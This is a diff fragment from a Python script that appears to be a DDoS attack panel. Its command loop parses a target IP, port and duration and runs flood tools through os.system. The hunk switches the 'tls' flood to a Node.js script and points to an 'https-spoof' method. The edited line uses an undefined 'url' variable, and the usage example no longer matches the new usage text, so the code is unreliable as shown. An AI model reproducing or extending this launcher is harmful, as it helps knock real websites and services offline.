@@ -471,9 +471,9 @@ def main():
                 ip = cnc.split()[2]
                 port = cnc.split()[3]
                 time = cnc.split()[4] 
-                os.system(f'./tls {method} {ip} {port} {time} 2048')
+                os.system(f'node tls.js {url} {time} 2048')
             except IndexError:
-                print('Usage: tls <url> <port> <time>')
+                print('Usage: tls <url> <time>')
                 print('Example: tls https://1.1.1.1 443 60')
     
         elif "https-spoof" in cnc:
